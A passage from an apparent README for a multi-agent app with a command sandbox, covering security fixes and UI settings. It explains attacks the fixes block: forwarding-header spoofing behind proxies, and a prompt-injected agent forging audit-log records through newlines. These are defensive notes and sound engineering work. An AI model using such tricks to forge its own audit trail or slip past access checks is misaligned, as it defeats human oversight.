  server in the panel and its `Authorization` header still comes back — that is a test, not a hope. 🪪
- 🚮 **A mask with nothing behind it is dropped, and said so.** Add a brand-new server, leave the header box
  showing `********`, and there is no stored value to put back — so the header is **not written at all**
  rather than being saved as the literal asterisks, which would have been a credential that authenticates as
  nothing and looks like the far end's fault. The count is reported back on the save. 🧾
- ✍️ **A real value typed over the mask wins.** Paste a new key into that box and it is stored as typed —
  masking only ever stands in for "unchanged". 🔑
- 👁️ **A friend's token is visible exactly once** — when it is created, or when **ROTATE** is pressed: the
  server keeps it, and a later read answers the mask. The **COPY** button refuses to hand over a mask for the
  same reason the drop above exists: pasting `********` into a client authenticates as a wrong token, and the
  failure reads as the *server's* problem rather than as a copy that copied nothing. 📋🚫
- 🧪 **Proven, not assumed** — `tests/php/secrets.test.php` asserts the mask on every field, that empty stays
  empty, that a credential-free proxy stays readable, a **clean round-trip restores every secret**, a renamed
  server keeps its header (URL match), an unresolvable mask is **dropped and counted**, and a typed value
  beats the mask. ✅

### 🏠 21. No token set — this machine only

`./setup-token.sh --off` prints that it is fine on *"a machine nothing else can reach"* — and until v360
nothing enforced it. On a copy behind a web server bound to all interfaces, that was not a theoretical gap:
**`POST /api/sandbox/program` is a program launcher an agent can reach**, `POST /api/sandbox/exec` runs
commands, and `GET /api/config` — the route from §20 — **answered with the very token that guards the routes
which *were* protected.** 🚪🔓

- 🧭 **Now the documented posture is the enforced posture.** With `require_token` off, a request whose peer
  address is **not loopback** gets **`403 {"error":"local requests only"}`**, plus the one-liner that fixes it:
  `./setup-token.sh` (or `start.bat -Token` on Windows), then paste the token into **Config → Access token**
  on each device — after which the copy is reachable from anywhere again, which is what a token is for. 🔑
- 🔁 **Loopback means all of `127.0.0.0/8`**, plus `::1` and the IPv4-mapped `::ffff:127.0.0.1` that some
  Windows stacks report. Every spelling is asserted in the suite, along with a LAN address, another private
  address and a public one — none of which are local. 🧪
- 🧱 **A reverse proxy no longer defeats it.** The rule used to trust the socket peer alone, so nginx or
  Apache on the same host connected from `127.0.0.1` and **every internet visitor looked local**. A forwarding
  header (`X-Forwarded-For`, `X-Real-IP`, `Forwarded`, `CF-Connecting-IP`) now marks a request as proxied, and
  the client is read from it **only when the peer is a proxy you listed** in `sandbox.trusted_proxies`
  (`storage/config.json`; addresses or CIDR — `["127.0.0.1", "10.0.0.0/8"]`). An **undeclared** proxy is
  refused outright, because the header is then just something the caller typed. `X-Forwarded-For` is read from
  the **right**, so a spoofed left-most `127.0.0.1` cannot win. 🔍
- 🔧 **The proxy has to forward the client.** The check needs the header to exist: nginx wants
  `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`, and a bare Apache `ProxyPass` sends nothing.
  A proxy that forwards no address is indistinguishable from a local request at the HTTP layer — which is
  what the switch below is for.
- 🎚️ **Config → Permissions → Remote access → "Judge proxied requests by the client"** turns the whole
  rule off (default **on**). Off restores the socket-peer test, and is only right when your proxy forwards no
  client address at all — with the gate off and no token, it reopens exactly the hole described above.
  Saved as `sandbox.local_only_strict`; a config written before the key existed keeps it **on**. 🛡️
- 🕳️ **No peer address passes only in the CLI.** A web request without one is a broken SAPI, not a local
  visitor, so it is refused instead of inheriting the CLI exemption. 🖥️
- 🎭 **The `Host` header is deliberately not consulted.** It is client-supplied, so a rule like "the Host
  matched the peer address" would let anyone in by naming **their own** address in the request. The decision
  is made on the **socket** — or, behind a declared proxy, on the address that proxy forwards. 🚫
- 🤝 **The MCP RPC route is exempt, on purpose.** `POST /api/mcp-server` exists for other machines and keeps
  its own **per-friend Bearer token** with a **read / write / exec** scope ceiling, an optional IP allowlist
  and one-click revoke (§12). It is the one door this rule must leave open — and it is a *door*, not a hole:
  the caller is authenticated before anything runs. 🔐

### 🧾 22. The trace is written by this app alone

`storage/exec.log` is the audit trail — the two-phase `run=… phase=start|end` record that **Config → TRACE →
EXEC** reads back, that pairs a command's start with its end, and that shows an opened window as *started and
still running*. 🧾 Its authority depends on one property: **one line per record.** 📏

- 🪤 **So a newline is a forgery.** Free text reaches these fields — the **agent name** arrives in the tool
  call, and every **argv element** is whatever a model sent. A `\n` in either one would let a prompt-injected
  agent **append a hand-written line** describing a command that never ran (or, worse, make a real one look
  like part of a different record) — the audit trail quietly rewritten by the thing it is auditing. 🎭
- 🛡️ **Stripped at the one chokepoint, not at the callers.** Sanitising lives **inside `Sandbox::audit()`**,
  which `exec`, `run_code`, `window_open` and `window_close` all pass through — so a future caller cannot
  forget it, and it runs **before** the shell-quoting decision below, so a quote-escaped argument cannot carry
  a line break through the escaping. 🚧
- 🧬 **Two shapes, because the line carries two kinds of field.** The fields the reader takes as a **single
  token** (`run`, `phase`, `kind`, `agent`) lose everything from the first break onward and any character
  outside `[\w.:@-]` — a space there would split the field and make the whole line unparseable, which would
  lose a **real** record while stopping a forged one. Free text (`cwd`, the program, the argv) turns breaks
  into a space and is capped (240 characters per field, 12 argv elements), so one enormous argument cannot
  bloat the log either. ✂️ An empty token becomes `-`, because an empty field breaks the reader's pattern. 🩹
- 👀 **The reader still shows the interesting failure.** Start and end lines are paired by their `run` id, and
  a start with no end comes back as `finished: false` — *started, never finished* is exactly the row you want
  to see after a crash or a kill mid-command, so it is surfaced rather than hidden. 🔍
- 🧪 **Proven** — `tests/php/programs.test.php` §5d writes an audit entry whose agent name contains a newline
  and a complete fake record (`run=forged-inject phase=start …`), then asserts the real run is still recorded
  in one piece **and that the forged run id never becomes an entry of its own**. ✅

### 🧪 23. The test suite cannot touch the trace — or another file's server

`tests/` is dev tooling the app never loads, and it now runs **four files at a time**. That is only safe because
the two things those files used to share were taken away first — and both of them were **state this app's own
security rests on**. 🧪

- 🧾 **The audit trail is not a scratch file.** `storage/exec.log` is the two-phase record covered in **§22**: the
  answer to *"did anything actually run?"*. Two test files wrote it, and each remembered its size on entry and
  **truncated it back on the way out** — tidy when you are the only writer, and a **deletion of another file's
  lines** the moment you are not, which is exactly what running them at the same time makes them. A test run could
  be mistaken for real commands, and a real command's record could vanish under one. The trace a test writes now
  goes to a directory of that file's own: `Sandbox::logDir()` honours `ROUTER_LOG_DIR`, the runner sets it per
  file, and `storage/mcp.log` (**§12**) goes the same way. Running the whole suite leaves the operator's
  `exec.log` and `mcp.log` **byte-identical** — measured, not hoped. 🛡️
- 🔒 **The redirect cannot be reached from outside.** `ROUTER_LOG_DIR` is read from the **process environment**.
  There is no route, header, query string or config field that sets it, so no request and no model can move, hide
  or read a log by asking for it, and unset — the normal state — keeps `storage/` exactly as it was. Its only
  reachable effect is to add a directory that a test writes to. 🚫
- 🌐 **Loopback only, and a port of its own.** Every server the suite starts binds **`127.0.0.1`** and never
  `0.0.0.0` — the generated Apache config is literally `Listen 127.0.0.1:<port>` — and the port is now a walk
  from `21000 + pid % 4000`, which stays **below the OS's ephemeral range**. The old way asked the OS for "any
  free port" (`tcp://127.0.0.1:0`), which is a race the moment two files ask at the same moment: the number
  returns to the pool as the socket closes, so both can be handed the same one and one file ends up **talking to
  the other file's server** — assertions answered by a server it never started. A port a real service is *using*
  is no longer a candidate either, which matters because a bind failure there looks exactly like a broken build. 🧭
- 🙋 **Separate processes, for the same reason as ever.** The suite separates its files so one cannot colour
  another's result (**§17**). A file that can reach into another file's socket or log can report green for
  something it never checked, so "each file is its own process" has to stay true down to the port it binds and
  the file it writes. ✅
- 🧪 **Proven** — six consecutive four-wide runs plus `--jobs 8` and `--jobs 2`, all green with identical counts;
  sampling `netstat` during a run caught **seven simultaneous listeners, all inside the pid-derived band and none
  of them repeated**; run by itself with `ROUTER_LOG_DIR` set, `sandbox.test.php` writes its 9 audit lines into
  that directory while the install's `exec.log` is unchanged; and a full fresh-copy check — `PHP 28 files, 28 passed, 1,263 assertions, 5 skipped` and `JS 31 files, 31 passed, 836 assertions` — costs about 31s end to end. 🔬

> 🧷 **One rule underneath all of this:** nothing that a model can *write* ever becomes a decision the app
> obeys. A name, not a path; argv, not a command line; a mask, not a credential; the peer address, not the
> `Host` header; one token, not two records. That is the whole design, repeated in five different places. 💙

---
## 🖥️ Two interfaces, one switch

Both shells are the same application: one store, one set of components, one feature list. `settings.interfaceMode` decides which decoration is worn, and it applies the moment you pick it in **Config → Interface** — no reload, no second install, and **no feature that exists in only one of them**.

<details>
<summary>Comparison table, layout map and the two rules</summary>

| | 🗂️ **Classic** *(the default)* | 💎 **Desktop 2026** |
| --- | --- | --- |
| Layout | setup · chat · map, side by side | floating glass cards on an edge rail, map front-centre |
| Config | collapsible sections in the left panel | drawers that fly out of their label — and **retract back into it** as one motion |
| Chat | standard width | **440px** by default, drag the edge to widen, or throw it to the full screen |
| Panels | always where they are | optional **tuck-away** while a node's card is open |
| Glass | flat — no blur, no glow, no drift | frosted cards, border glow, ambient motion: every one adjustable, every one switchable off |
| Map controls | inside the map panel | lifted into the header, centred over the apps notch |
| Below 1025px | slide-over drawers | the same slide-over drawers |

```
                            DESKTOP 2026 — where things live
+-------------+---------------------------------------+-------------+
|   RAIL      |                  CHAT                 |     MAP     |
|             |                                       |             |
| sessions    | drag the edge to widen, or            | nodes,      |
| agents      | throw it to the full screen.          | beams,      |
| providers   | 440px by default.                     | fog, floor  |
| config ---> |                                       |             |
| mcp         |                                       | 3D / 2D     |
+-------------+---------------------------------------+-------------+
      ^ Config flies out of its label, then retracts back into it

  CLASSIC is the same app with all three panels always open:
  +--------------+-------------+---------------+
  |    SETUP     |    CHAT     |      MAP      |
  +--------------+-------------+---------------+
```

> 🗂️ **Config, tidied.** The Config tab is split into collapsible sections —
> **Interface · Limits & Budgets · Permissions · Labs · Resource Manager ·
> Throttle / Limiter · MCP Client · MCP Server**, with **Desktop** appended as its
> own card (see *Config → Desktop* above) — each carrying a live status badge on
> its header. It also **rescues numbers you typed but haven't Saved yet**, so
> switching tabs mid-edit never silently discards them.

Two rules kept that honest:

- 🧩 **The choice is the only switch.** Nothing else forks. `ui/js/desktop2026.js` *decorates* the DOM the existing components already render — it owns no state and no feature — so a bug in the shell can never take one with it.
- 📱 **Narrow windows are untouched.** Under 1025px both shells resolve to the same slide-over drawer layout, which is why the phone view looks and behaves exactly as it always did.

</details>

---
## 🎛️ Config → Desktop — the machine-room card

![Config → Desktop: performance mode, glass and topography controls](screenshots/desktop-settings.png)

The card is in **both** shells on purpose. Most of it is the map — fog, bloom, floor, frame rate, detail — so Classic gets it too. The rows that address the glass (chat background, blur, glow, ambient motion, the floating floor) stay **visible** in Classic with their saved values but are disabled there, because there is no glass to tune. Nothing is hidden and nothing is lost. 🧷

<details>
<summary>Knob-by-knob table, the preset, topography and defaults</summary>

### 🧮 What each knob buys

| Knob | Fresh default | Relative GPU cost | What it does |
| --- | --- | --- | --- |
| 🌫️ **Glass blur** | **1px** | ██████████ **the big one** | `backdrop-filter` behind every card — a live canvas re-composited each frame |
| 🎚️ **Map detail** | **100%** | ███████ | internal resolution: 100 / 85 / 70 / 55 / 42% of the pixel-ratio cap |
| ✨ **Bloom glow** | **on** | ██████ | multi-pass blur halos on nodes and beams |
| 🟠 **Floating floor** | **on** | ████ | the big screen-blended polar grid layer over the canvas |
| 🎞️ **Frames per second** | **60** | ███ | hard cap on redraws (1–60) |
| 🟣 **Glow & border animation** | **100%** | ██ | the colour running around card borders |
| 🌀 **Ambient motion** | **100%** | ██ | background sweep, floor scan, the slow breathing |
| 🔄 **Slow auto-rotate** | **on** | █ | idle camera drift, 12s after you stop touching the map |
| 💬 **Chat background** | **4%** | ░ free | how much of the map shows through the chat |
| 📌 **Fix the floor in place** | **on** | ░ free | keeps the fallback grid still in the window |
| 🪶 **Tuck panels away** | **on** | ░ free | slides the rail and the chat aside while a node card is open |
| 🐢 **Performance mode** | **off** | — | one click: the cheap column, still editable |

Every row is a normal setting with its own control — the defaults above are defaults, not law. 🎛️

### ⚡ Performance mode is a preset, not another mode

One switch writes **the same nine settings the controls above already own** — blur 0, glow 0, motion 0, fog off, 30fps, 70% detail, bloom off, floating floor off, auto-rotate off — plus Resource Manager's **pause-when-covered** and **idle throttle**.

- 🧷 **It only ever tightens** — already at 24fps? it keeps 24, not 30.
- ↩️ **Switching it off gives your numbers back** — it restores the values it actually wrote, and a knob you moved by hand in the meantime keeps *your* value instead of being silently reverted.
- 🔍 **Every row stays visible**, so you can see exactly what it did and undo one part of it without undoing the rest.
- 🚫 **Nothing is removed, hidden or disabled** by the preset — which is the whole point of it being a preset.

### 🗺️ The topography, in detail

- 🌫️ **Background fog** — a haze that begins past the polar grid, under the graph, and reaches the top of the panel. Since **v336** it is drawn as the **scene background in screen space**, not as fog in the world: it cannot orbit, slide or zoom with the map, and it always fills the window. The checkbox turns it on and off; the scene still knows a third, older "full fog" mode internally (`topoFog: 0`), which the card deliberately does not offer.
- ✨ **Bloom** — the glow on every node and beam comes from one post-process pass, not from per-object tricks. Off keeps every emissive colour and drops the multi-pass blur.
- 🟠 **Floating floor** — the fixed polar grid belongs to the glass shell, so Classic always uses the cheap grid that lives inside the scene. In Desktop 2026 the DOM floor layer is the expensive one: a `150vmax` screen-blended element over the canvas.
- 📌 **Fix the floor in place** — the in-scene grid is part of the world, so orbiting carried it around and a low angle squashed it into a line. This holds it at the same spot in the window while orbiting, dragging and zooming all keep working. It only means something while the floating floor is **off**, so the row is disabled (not hidden, and keeping its value) whenever the floating floor is showing.
- 🎚️ **Map detail** — five explicit steps. **This is the one that used to degrade itself:** the map silently stepped its own resolution down whenever a frame ran long, which on a slower machine read as three or four visible “flashes” of the lines getting fuzzier a few seconds after load. It is manual now and stays exactly where you put it — and each step also holds the **composer** (bloom’s mip chain included) at that resolution, so the saving is real instead of a smaller final blit.
- 🎞️ **Frames per second** — a hard cap, 1 to 60, independent of everything else.
- 🔄 **Slow auto-rotate** — the drift resumes 12s after you stop. Off parks the view until you orbit it yourself, which is also what lets the scene — and everything composited over it — go genuinely idle.

> 💡 **On a low-powered machine:** glass blur to **0** (0 removes the backdrop layer entirely — `blur(0px)` would still cost one), bloom and the floating floor **off**, detail **70%**, cap **30fps** — or just click **Performance mode** and adjust from there. Every one of those is reversible. 🔁

### 🎚️ Defaults on a fresh install

| Section | Defaults |
| --- | --- |
| 🖥️ **Desktop** | tuck panels away **on** · chat background **4%** · glass blur **1px** · glow **100%** · ambient motion **100%** · background fog **on** · bloom **on** · floating floor **on** · floor **pinned** · auto-rotate **on** · map detail **100%** · **60fps** · performance mode **off** |
| 🧪 **Labs** | API pool **on** · Keep Live when hidden **on** · built-in **Browser off** |
| 🛠️ **Harness / Dialect** | dynamic tools **on** · dialect memo **on** · negative memo **on** · cold hint **on** · telemetry **on** · durable lock · real-success only · drill gate · clone inherit **off** |
| 🧮 **Resource Manager** | all four switches **off** |

Saved settings always win: a fresh copy starts here, and an existing install keeps whatever you already chose until you move that control. 💾

</details>

---

## 🖼️ Images & vision

Drop an image into the composer and a vision-capable agent can see it. 👁️🖼️

<details>
<summary>Paste, drop or pick, safety and per-agent vision</summary>

- 📎 **Paste, drop or pick** — the bytes **never touch the server**. They become an in-memory `data:` URL and ride in the request's `image_url` field: 🚫 no upload endpoint, 🚫 no file on disk.
- 🛡️ **Safe by construction** — only 🖼️ PNG / 📷 JPEG / 🎞️ WebP / 🎬 GIF are accepted, all inert when sniffed, which keeps the polyglot *"image that is also a script"* family out.
- 🤖 **Per-agent** — only models that actually support vision get the attachment; everyone else is unaffected.

</details>

---
## 🎙️ Voice & audio

Talk to the team, and let them talk back. 🗣️🔊

<details>
<summary>Speech-to-text, spoken replies, engines and pitch</summary>

- 🎤 **Speech to text** — the mic button turns your voice into a message in the composer.
- 🔊 **Speak replies** — a speaker button reads any reply aloud; flip **Speak every reply automatically** to hear them all.
- 🧰 **Three engine choices** — Auto (provider when usable, built-in voices otherwise), your provider's TTS via API key, or the browser's 🏠 built-in voices (works offline, no API, no key). A custom endpoint field takes an OpenAI-compatible TTS server — e.g. `http://localhost:8000/v1` for a local model — so no cloud is needed at all.
- ⏩ **Speed** and 🎚️ **pitch** — tune playback; pitch reads higher as female, lower as male. 🤖 **Each agent can override the pitch**, so a whole roster can sound distinct.

</details>

---
## ⌨️ Slash commands

Type `/` in the composer for a palette of everything you can address. ⌨️✨

<details>
<summary>Targets, app commands and quick reference</summary>

- 🎯 **Target an agent** — `/CODE`, `/ROLE`, `/NAME` or `/ALL` sends your next message to one agent, a role, or the whole team.
- 🧭 **App commands** — the palette also lists the app's own commands, and never suggests one that wouldn't work here.
- ❓ **`/?`** — a quick reference, right in the input box.

</details>

---
## ♾️ Always-On — the loop that runs itself

Give an agent a **standing goal** and this app re-invokes it on a timer, one turn
at a time, until it finishes or you stop it. It is the difference between *"ask
the model a thing"* and *"hand the model a job and walk away."* 🚶♂️💨

<details>
<summary>Goals, cadence, badges, caps, kill switch and tips</summary>

- 🎯 **A standing goal per agent** — set it in the agent editor (or Brain Lab). Every tick, the agent is re-prompted with its goal, the iteration number, and a plain instruction to **make concrete progress now using its tools.**
- ⏱️ **A cadence you own** — the interval lives in **Config → Limits & Budgets** (default generous, because every iteration is **billed**). 💸
- 🧭 **An honest badge** — each agent card shows **RUNNING** while it works, **HELD** when it's parked, and idle otherwise, so a glance tells you the truth.
- 🛑 **Stop one, release one** — click an agent's **ALWAYS ON** badge to stop that run without switching the agent off. It becomes **HELD**; click again to release it and resume next tick.
- 🧰 **Release *everyone* in one click** — **Config → Permissions → Always-On** shows how many agents are held and a **RELEASE HELD AGENTS** button, so a roster parked by a cap (or by hand) is never a trap you have to click through one agent at a time.
- 🧨 **Two spend caps, both off by default** — **Max iterations** and **Max minutes**. When a cap trips the agent is **parked and held** (that's the point of a spend guard) and the status line tells you when a cadence is long enough that the cap would fire after a *single* tick — so you can set it to `0` and loop forever if that's what you want.
- 🔌 **Survives leaving the tab** — flip **Config → Permissions → Run while tab is hidden** and the timer is driven by a **Web Worker** (page timers are throttled hard in a background tab), with the in-flight turn no longer aborted the moment you switch away. Come back and it ticks immediately.
- 🧯 **Master kill switch** — **Config → Permissions → *Enable always-on*** stops everything at once, aborts in-flight autonomous turns, and **releases everyone** so switching it back on is a clean, working reset.
- ✅ **Only the right agents run** — an agent needs a standing goal **and** its own always-on switch **and** to be active **and** not held before the scheduler will touch it.
- 🧵 **Runs in the page, by design.** There is no server-side runner — this stops when the tab closes, which is exactly why it's cheap and easy to reason about.

> 📝 **Tip:** a standing goal of `idle` (or two words) gives the agent nothing to
> aim at, so it will wander and "explore." Give it a real objective — *"run the
> test suite and fix failures until green."* The status line in Config tells you
> roughly how many turns/hour that will cost.

</details>

---
## ❝ Global pre-prompt override — one instruction for the whole fleet

A single box in the **Agents-tab header** (§ button) that reaches **every agent's
system prompt**, on every call path — main chat, ask-directly and routing-chart
runs alike. ✨

<details>
<summary>Prepend